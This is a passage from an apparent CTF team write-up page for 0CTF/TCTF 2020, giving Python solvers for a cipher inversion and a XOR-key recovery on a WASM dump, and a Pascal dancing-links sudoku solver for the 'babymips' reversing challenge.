    return (((o + (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>) - t) &amp; ((<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>) - <span class="hljs-number">1</span>)) &gt;&gt; <span class="hljs-number">16</span>) + <span class="hljs-number">1</span>


def f2(a, b):
    r = []
    for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0x10000</span>):
        if f1(i, b) == a:
            r<span class="hljs-number">.</span>append(i)
    assert len(r) != <span class="hljs-number">0</span>
    return r[<span class="hljs-number">0</span>]

arr = [
<span class="hljs-number">0xEF28DD7F</span>, <span class="hljs-number">0x5078615A</span>,
<span class="hljs-number">0x955A0F80</span>, <span class="hljs-number">0x15682E55</span>,
<span class="hljs-number">0x538F435E</span>, <span class="hljs-number">0xE71BCEEE</span>,
<span class="hljs-number">0x5675A3E5</span>, <span class="hljs-number">0x7BF39DAD</span>,
]
s = b<span class="hljs-string">&#x27;&#x27;
for j in range(0, 8, 2):
    r0 = arr[j]
    r1 = arr[j + 1]
    kx = 48

    r0h = (r0 &gt;&gt; 16) &amp; 0xFFFF
    r0l = r0 &amp; 0xFFFF
    p[2] = sub(bswap(r0h), k[kx + 1])
    p[0] = f2(bswap(r0l), k[kx + 0])

    r1h = (r1 &gt;&gt; 16) &amp; 0xFFFF
    r1l = r1 &amp; 0xFFFF
    p[3] = f2(bswap(r1h), k[kx + 3])
    p[1] = sub(bswap(r1l), k[kx + 2])

    for i in range(8):
        kx -= 6

        t1 = f1(p[0] ^ p[1], k[kx + 4])
        t3 = f1(add(p[3] ^ p[2], t1), k[kx + 5])
        t4 = add(t1, t3)
        t0 = p[0] ^ t3
        u2 = p[1] ^ t3
        u1 = p[2] ^ t4
        t2 = p[3] ^ t4
        p[1] = sub(u1, k[kx + 1])
        p[2] = sub(u2, k[kx + 2])
        p[0] = f2(t0, k[kx + 0])
        p[3] = f2(t2, k[kx + 3])
        
    
    s += bytes.fromhex(f&#x27;</span>{p[<span class="hljs-number">0</span>]:04x}{p[<span class="hljs-number">1</span>]:04x}{p[<span class="hljs-number">2</span>]:04x}{p[<span class="hljs-number">3</span>]:04x}<span class="hljs-string">&#x27;)
print(s)</span></code></pre><h3 id="w"><a class="header-link" href="#w"></a>w</h3>
<pre class="hljs"><code>


<span class="hljs-attribute">buf</span> = open(&#x27;dmp&#x27;, &#x27;rb&#x27;).read()

<span class="hljs-attribute">key</span> = bytearray(<span class="hljs-number">0</span>x<span class="hljs-number">20</span>)

<span class="hljs-attribute">def</span> once(idx, known):
    <span class="hljs-attribute">global</span> key
    <span class="hljs-attribute">a</span> = <span class="hljs-number">0</span>xFF
    <span class="hljs-attribute">for</span> j in range(idx, idx + len(known)):
        <span class="hljs-attribute">c</span> = j &amp; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>F
        <span class="hljs-comment"># b - c = known[j]</span>
        <span class="hljs-attribute">b</span> = c + known[j - idx]
        <span class="hljs-comment"># b = a ^ key[c] ^ buf[j]</span>
        <span class="hljs-attribute">if</span> j != idx:
            <span class="hljs-attribute">key</span>[c] = b ^ a ^ buf[j]
        <span class="hljs-attribute">a</span> = buf[j]
    
<span class="hljs-attribute">known</span> = bytes.fromhex(&#x27;<span class="hljs-number">00</span> <span class="hljs-number">61</span> <span class="hljs-number">73</span> <span class="hljs-number">6</span>D <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">62</span> <span class="hljs-number">0</span>F <span class="hljs-number">60</span> <span class="hljs-number">01</span> <span class="hljs-number">7</span>F <span class="hljs-number">01</span> <span class="hljs-number">7</span>F<span class="hljs-number">60</span> <span class="hljs-number">03</span> <span class="hljs-number">7</span>F <span class="hljs-number">7</span>F <span class="hljs-number">7</span>F <span class="hljs-number">01</span> <span class="hljs-number">7</span>F <span class="hljs-number">60</span> <span class="hljs-number">03</span> <span class="hljs-number">7</span>F <span class="hljs-number">7</span>E <span class="hljs-number">7</span>F <span class="hljs-number">01</span> <span class="hljs-number">7</span>E <span class="hljs-number">60</span> <span class="hljs-number">01</span>&#x27;.replace(&#x27; &#x27;, &#x27;&#x27;))

<span class="hljs-attribute">once</span>(<span class="hljs-number">0</span>, known)

<span class="hljs-attribute">known</span> = b&#x27;wasi_snapshot_preview<span class="hljs-number">1</span>.&#x27;
<span class="hljs-attribute">once</span>(<span class="hljs-number">0</span>x<span class="hljs-number">40</span>, known)

<span class="hljs-attribute">known</span> = b&#x27;Welcome to <span class="hljs-number">0</span>CTF/TCTF <span class="hljs-number">2020</span>! Have a g<span class="hljs-number">00</span>d time&#x27;
<span class="hljs-attribute">once</span>(<span class="hljs-number">0</span>x<span class="hljs-number">4</span>F<span class="hljs-number">32</span>, known)
<span class="hljs-attribute">key</span>[<span class="hljs-number">0</span>] = ord(&#x27;e&#x27;)

<span class="hljs-attribute">print</span>(key)

<span class="hljs-attribute">size</span> = <span class="hljs-number">0</span>x<span class="hljs-number">5000</span>
<span class="hljs-attribute">buf2</span> = bytearray(buf)
<span class="hljs-attribute">for</span> i in range(size // <span class="hljs-number">0</span>x<span class="hljs-number">200</span>):
    <span class="hljs-attribute">a</span> = <span class="hljs-number">0</span>xFF
    <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">0</span>x<span class="hljs-number">200</span>):
        <span class="hljs-attribute">c</span> = j &amp; <span class="hljs-number">0</span>x<span class="hljs-number">1</span>F
        <span class="hljs-attribute">b</span> = a ^ key[c] ^ buf<span class="hljs-number">2</span>[i * <span class="hljs-number">512</span> + j]
        <span class="hljs-attribute">a</span> = buf<span class="hljs-number">2</span>[i * <span class="hljs-number">512</span> + j]
        <span class="hljs-attribute">buf2</span>[i * <span class="hljs-number">512</span> + j] = (b + <span class="hljs-number">0</span>x<span class="hljs-number">100</span> - c) &amp; <span class="hljs-number">0</span>xFF

<span class="hljs-attribute">open</span>(&#x27;dd&#x27;, &#x27;wb&#x27;).write(buf<span class="hljs-number">2</span>)</code></pre><pre class="hljs"><code><span class="hljs-attr">p</span> = <span class="hljs-number">22229</span>
<span class="hljs-attr">q</span> = <span class="hljs-number">227081</span></code></pre><h3 id="babymips"><a class="header-link" href="#babymips"></a>babymips</h3>
<p>逆完了是个数独</p>
<pre class="hljs"><code><span class="hljs-string">..8...7..</span>
<span class="hljs-string">...1..8..</span>
1.<span class="hljs-string">....6..</span>
<span class="hljs-string">.3.8.5.6.</span>
3.<span class="hljs-string">.......</span>
6.<span class="hljs-string">.21..78</span>
5.<span class="hljs-string">...8..7</span>
4.1.<span class="hljs-string">....2</span>
8.<span class="hljs-string">.....14</span></code></pre><p>3x3规则改成了</p>
<pre class="hljs"><code>m = [<span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x50</span>]
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):
        v = m[i * <span class="hljs-number">9</span> + j]
        tmp[j] = x[v]
    check_unique(tmp)</code></pre><p>解数独</p>
<pre class="hljs"><code><span class="hljs-keyword">program</span> sudoku;
<span class="hljs-keyword">const</span>
  maxn=<span class="hljs-number">9</span>*<span class="hljs-number">9</span>*<span class="hljs-number">9</span>;
  maxm=<span class="hljs-number">9</span>*<span class="hljs-number">9</span>*<span class="hljs-number">4</span>;
  maxp=(maxn+<span class="hljs-number">1</span>)*maxm;
  block:<span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">9</span>,<span class="hljs-number">1</span>..<span class="hljs-number">9</span>] <span class="hljs-keyword">of</span> integer
    = ((<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>),
       (<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>),
       (<span class="hljs-number">4</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>),
       (<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>),
       (<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>),
       (<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">9</span>),
       (<span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>),
       (<span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>),
       (<span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>));
        <span class="hljs-comment">(*
       =((1,1,1,2,2,2,3,3,3),
         (1,1,1,2,2,2,3,3,3),
         (1,1,1,2,2,2,3,3,3),
         (4,4,4,5,5,5,6,6,6),
         (4,4,4,5,5,5,6,6,6),
         (4,4,4,5,5,5,6,6,6),
         (7,7,7,8,8,8,9,9,9),
         (7,7,7,8,8,8,9,9,9),
         (7,7,7,8,8,8,9,9,9));
         *)</span>
<span class="hljs-keyword">type</span>
  ptr=<span class="hljs-keyword">record</span>
          up,down,left,right,num,n2:longint;
      <span class="hljs-keyword">end</span>;
  sudoku_t=<span class="hljs-keyword">record</span>
             x,y,k:integer;
           <span class="hljs-keyword">end</span>;
<span class="hljs-keyword">var</span>
  map:<span class="hljs-keyword">array</span> [<span class="hljs-number">0</span>..maxp] <span class="hljs-keyword">of</span> ptr;
  size:longint;
  head:<span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..maxn] <span class="hljs-keyword">of</span> longint;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">store</span><span class="hljs-params">(x,y,k:integer)</span>:</span>longint;
<span class="hljs-keyword">begin</span>
  <span class="hljs-keyword">exit</span>((x-<span class="hljs-number">1</span>)*<span class="hljs-number">9</span>*<span class="hljs-number">9</span>+(y-<span class="hljs-number">1</span>)*<span class="hljs-number">9</span>+k);
<span class="hljs-keyword">end</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rstore</span><span class="hljs-params">(x:longint)</span>:</span>sudoku_t;
<span class="hljs-keyword">var</span>
  f:sudoku_t;
<span class="hljs-keyword">begin</span>
  f.k:=(x-<span class="hljs-number">1</span>) <span class="hljs-keyword">mod</span> <span class="hljs-number">9</span> +<span class="hljs-number">1</span>;
  x:=(x-<span class="hljs-number">1</span>) <span class="hljs-keyword">div</span> <span class="hljs-number">9</span>;
  f.y:=x <span class="hljs-keyword">mod</span> <span class="hljs-number">9</span> +<span class="hljs-number">1</span>;
  x:=x <span class="hljs-keyword">div</span> <span class="hljs-number">9</span>;
  f.x:=x+<span class="hljs-number">1</span>;
  <span class="hljs-keyword">exit</span>(f);
<span class="hljs-keyword">end</span>;

<span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">addptr</span><span class="hljs-params">(x,y:longint)</span>;</span>
<span class="hljs-keyword">var</span>
  i:longint;
<span class="hljs-keyword">begin</span>
  inc(size);
  map[size].n2:=x;
  map[size].up:=y;
  map[size].down:=map[y].down;
  map[size].num:=y;
  inc(map[y].num);
  map[map[y].down].up:=size;
  map[y].down:=size;
  <span class="hljs-keyword">if</span> head[x]=<span class="hljs-number">0</span> <span class="hljs-keyword">then</span>
  <span class="hljs-keyword">begin</span>
    map[size].left:=size;
    map[size].right:=size;
    head[x]:=size;
  <span class="hljs-keyword">end</span>
  <span class="hljs-keyword">else</span>
  <span class="hljs-keyword">begin</span>
    i:=head[x];
    <span class="hljs-keyword">while</span> map[map[i].right].num&gt;map[i].num <span class="hljs-keyword">do</span>
      i:=map[i].right;
    map[size].left:=i;
    map[size].right:=map[i].right;
    map[map[i].right].left:=size;
    map[i].right:=size;
  <span class="hljs-keyword">end</span>;
<span class="hljs-keyword">end</span>;

<span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">dellr</span><span class="hljs-params">(x:longint)</span>;</span>
<span class="hljs-keyword">var</span>
   i,j:integer;
<span class="hljs-keyword">begin</span>
  dec(map[<span class="hljs-number">0</span>].num);
  map[map[x].left].right:=map[x].right;
  map[map[x].right].left:=map[x].left;
  i:=map[x].down;
  <span class="hljs-keyword">while</span> i&lt;&gt;x <span class="hljs-keyword">do</span>
  <span class="hljs-keyword">begin</span>
    j:=map[i].right;
    <span class="hljs-keyword">while</span> j&lt;&gt;i <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">begin</span>
      map[map[j].up].down:=map[j].down;
      map[map[j].down].up:=map[j].up;
      dec(map[map[j].num].num);
      j:=map[j].right;
    <span class="hljs-keyword">end</span>;
    i:=map[i].down;
  <span class="hljs-keyword">end</span>;
<span class="hljs-keyword">end</span>;

<span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">addlr</span><span class="hljs-params">(x:longint)</span>;</span>
<span class="hljs-keyword">var</span>
  j,i:integer;
<span class="hljs-keyword">begin</span>
  inc(map[<span class="hljs-number">0</span>].num);
  map[map[x].left].right:=x;
  map[map[x].right].left:=x;
  i:=map[x].down;
  <span class="hljs-keyword">while</span> i&lt;&gt;x <span class="hljs-keyword">do</span>
  <span class="hljs-keyword">begin</span>
    j:=map[i].right;
    <span class="hljs-keyword">while</span> j&lt;&gt;i <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">begin</span>
      map[map[j].up].down:=j;
      map[map[j].down].up:=j;
      inc(map[map[j].num].num);
      j:=map[j].right;
    <span class="hljs-keyword">end</span>;
    i:=map[i].down;
  <span class="hljs-keyword">end</span>;
<span class="hljs-keyword">end</span>;

<span class="hljs-keyword">var</span>
  ansl:longint;
  ans:<span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..maxn] <span class="hljs-keyword">of</span> longint;

<span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">init</span>;</span>
<span class="hljs-keyword">var</span>
  i,x,y,k,p:integer;
  c:char;
<span class="hljs-keyword">begin</span>
  fillchar(map,sizeof(map),<span class="hljs-number">0</span>);
  fillchar(head,sizeof(head),<span class="hljs-number">0</span>);
  ansl:=<span class="hljs-number">0</span>;
  size:=<span class="hljs-number">0</span>;
  map[<span class="hljs-number">0</span>].num:=maxm;
  <span class="hljs-keyword">for</span> i:=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> maxm <span class="hljs-keyword">do</span>
  <span class="hljs-keyword">begin</span>
    inc(size);
    map[size].up:=size;
    map[size].down:=size;
    map[size].left:=size-<span class="hljs-number">1</span>;
    map[size].right:=map[size-<span class="hljs-number">1</span>].right;
    map[map[size-<span class="hljs-number">1</span>].right].left:=size;
    map[size-<span class="hljs-number">1</span>].right:=size;
  <span class="hljs-keyword">end</span>;
  <span class="hljs-keyword">for</span> x:=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">9</span> <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">for</span> y:=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">9</span> <span class="hljs-keyword">do</span>
      <span class="hljs-keyword">for</span> k:=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">9</span> <span class="hljs-keyword">do</span>
      <span class="hljs-keyword">begin</span>
        p:=store(x,y,k);
        addptr(p,(x-<span class="hljs-number">1</span>)*<span class="hljs-number">9</span>+k);
        addptr(p,<span class="hljs-number">81</span>+(y-<span class="hljs-number">1</span>)*<span class="hljs-number">9</span>+k);
        addptr(p,<span class="hljs-number">162</span>+(block[x,y]-<span class="hljs-number">1</span>)*<span class="hljs-number">9</span>+k);
        addptr(p,<span class="hljs-number">243</span>+(x-<span class="hljs-number">1</span>)*<span class="hljs-number">9</span>+y);
      <span class="hljs-keyword">end</span>;
  <span class="hljs-keyword">for</span> x:=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">9</span> <span class="hljs-keyword">do</span>
  <span class="hljs-keyword">begin</span>
    <span class="hljs-keyword">for</span> y:=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">9</span> <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">begin</span>
      <span class="hljs-keyword">read</span>(c);
      <span class="hljs-keyword">if</span> c&lt;&gt;<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">then</span>
      <span class="hljs-keyword">begin</span>
        inc(ansl);
        ans[ansl]:=store(x,y,ord(c)-ord(<span class="hljs-string">&#x27;0&#x27;</span>));
        p:=head[ans[ansl]];
        dellr(map[p].num);
        i:=map[p].right;
        <span class="hljs-keyword">while</span> i&lt;&gt;p <span class="hljs-keyword">do</span>
        <span class="hljs-keyword">begin</span>
          dellr(map[i].num);
          i:=map[i].right;
        <span class="hljs-keyword">end</span>;
      <span class="hljs-keyword">end</span>;
    <span class="hljs-keyword">end</span>;
    readln;
  <span class="hljs-keyword">end</span>;
<span class="hljs-keyword">end</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">work</span>:</span>boolean;
<span class="hljs-keyword">var</span>
  i,p,j:longint;
  debug:sudoku_t;
<span class="hljs-keyword">begin</span>
  <span class="hljs-keyword">if</span> map[<span class="hljs-number">0</span>].num=<span class="hljs-number">0</span> <span class="hljs-keyword">then</span>
    <span class="hljs-keyword">exit</span>(true);
  i:=map[<span class="hljs-number">0</span>].right;
  p:=i;
  <span class="hljs-keyword">while</span> i&lt;&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">do</span>
  <span class="hljs-keyword">begin</span>
    <span class="hljs-keyword">if</span> map[i].num&lt;map[p].num <span class="hljs-keyword">then</span>
      p:=i;
    i:=map[i].right;
  <span class="hljs-keyword">end</span>;
  dellr(p);
  i:=map[p].down;
  <span class="hljs-keyword">while</span> i&lt;&gt;p <span class="hljs-keyword">do</span>
  <span class="hljs-keyword">begin</span>
    inc(ansl);
    ans[ansl]:=map[i].n2;
    debug:=rstore(ans[ansl]);
    j:=map[i].right;
    <span class="hljs-keyword">while</span> j&lt;&gt;i <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">begin</span>
      dellr(map[j].num);
      j:=map[j].right;
    <span class="hljs-keyword">end</span>;
    <span class="hljs-keyword">if</span> work() <span class="hljs-keyword">then</span>
      <span class="hljs-keyword">exit</span>(true);
    j:=map[i].left;
    <span class="hljs-keyword">while</span> j&lt;&gt;i <span class="hljs-keyword">do</span>
    <span class="hljs-keyword">begin</span>
      addlr(map[j].num);
      j:=map[j].left;
    <span class="hljs-keyword">end</span>;
    dec(ansl);
    i:=map[i].down;
  <span class="hljs-keyword">end</span>;
  addlr(p);
  <span class="hljs-keyword">exit</span>(false);
<span class="hljs-keyword">end</span>;

<span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">print</span>;</span>
<span class="hljs-keyword">var</span>
  a:<span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">9</span>,<span class="hljs-number">1</span>..<span class="hljs-number">9</span>] <span class="hljs-keyword">of</span> integer;
  i,j:longint;
  t:sudoku_t;
<span class="hljs-keyword">begin</span>
  fillchar(a,sizeof(a),<span class="hljs-number">0</span>);
  <span class="hljs-keyword">for</span> i:=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> ansl <span class="hljs-keyword">do</span>
  <span class="hljs-keyword">begin</span>
    t:=rstore(ans[i]);
    a[t.x,t.y]:=t.k;
  <span class="hljs-keyword">end</span>;
  <span class="hljs-keyword">for</span> i:=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">9</span> <span class="hljs-keyword">do</span>
  <span class="hljs-keyword">begin</span>
    <span class="hljs-keyword">for</span> j:=<span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">9</span> <span class="hljs-keyword">do</span>
      <span class="hljs-keyword">write</span>(a[i,j]);
    writeln;
  <span class="hljs-keyword">end</span>;
<span class="hljs-keyword">end</span>;

<span class="hljs-keyword">var</span>
  n:integer;
  fei:boolean;
<span class="hljs-keyword">begin</span>
  readln(n);
  <span class="hljs-keyword">while</span> n&lt;&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">do</span>
  <span class="hljs-keyword">begin</span>
    dec(n);
    init;
    fei:=work;
    print;
  <span class="hljs-keyword">end</span>;
<span class="hljs-keyword">end</span>.</code></pre>        </article>
      </div>
    </div>
  </body>
</html>
<!--
    This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek).
    This writeup site is cloned and modified from https://github.com/balsn/ctf_writeup.
    Respective Copyrights apply.
 -->
